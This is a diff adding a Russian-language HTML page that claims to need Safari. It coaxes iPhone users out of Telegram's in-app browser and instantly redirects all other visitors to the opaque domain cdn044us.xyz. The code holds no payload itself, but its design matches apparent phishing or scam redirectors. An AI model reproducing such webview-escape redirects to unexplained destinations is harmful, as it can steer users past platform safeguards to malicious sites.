@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Открытие в Safari</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
+            color: #1c1c1e;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 { font-size: 22px; margin-bottom: 15px; }
+        p { font-size: 16px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        .btn {
+            display: inline-block;
+            background-color: #007aff;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-size: 17px;
+            font-weight: 600;
+            width: 100%;
+            box-sizing: border-box;
+            transition: background-color 0.2s;
+        }
+        .btn:active { background-color: #0056b3; }
+        .icon { font-size: 48px; margin-bottom: 15px; }
+
+        /* Оверлей с инструкцией для iOS */
+        #ios-prompt {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            padding-bottom: 100px;
+            color: white;
+        }
+        #ios-prompt .arrow {
+            font-size: 40px;
+            animation: bounce 1.5s infinite;
+            margin-bottom: 15px;
+        }
+        #ios-prompt .text {
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.4;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="icon">🧭</div>
+        <h1>Требуется браузер Safari</h1>
+        <p>Для корректной работы этой страницы, пожалуйста, откройте её в браузере Safari.</p>
+        <a href="https://cdn044us.xyz/" target="_blank" rel="noopener noreferrer" class="btn" id="open-btn">
+            Открыть страницу
+        </a>
+    </div>
+
+    <!-- Инструкция для iOS (появляется только в Telegram на iPhone) -->
+    <div id="ios-prompt">
+        <div class="arrow">⬆️</div>
+        <div class="text">Нажмите на значок «Поделиться» <br>или «•••» в нижнем меню,<br>затем выберите <b>«Открыть в Safari»</b></div>
+    </div>
+
+    <script>
+        // Целевая ссылка
+        const TARGET_URL = "https://cdn044us.xyz/";
+
+        // Определение iOS и встроенного браузера Telegram
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+        const isTelegram = navigator.userAgent.toLowerCase().includes('telegram') || !!window.TelegramWebviewProxy;
+
+        if (isIOS && isTelegram) {
+            // Показываем оверлей с инструкцией
+            document.getElementById('ios-prompt').style.display = 'flex';
+            
+            // При клике на кнопку запускаем несколько методов открытия (для максимальной совместимости)
+            document.getElementById('open-btn').addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                // Метод 1: Открытие в новой вкладке
+                window.open(TARGET_URL, '_blank');
+                
+                // Метод 2: Прямое перенаправление (иногда вызывает системный запрос на открытие во внешнем браузере)
+                setTimeout(() => {
+                    window.location.href = TARGET_URL;
+                }, 300);
+            });
+        } else {
+            // Для Android, Desktop или обычного Safari делаем мгновенный редирект
+            window.location.replace(TARGET_URL);
+        }
+    </script>
+</body>
+</html>
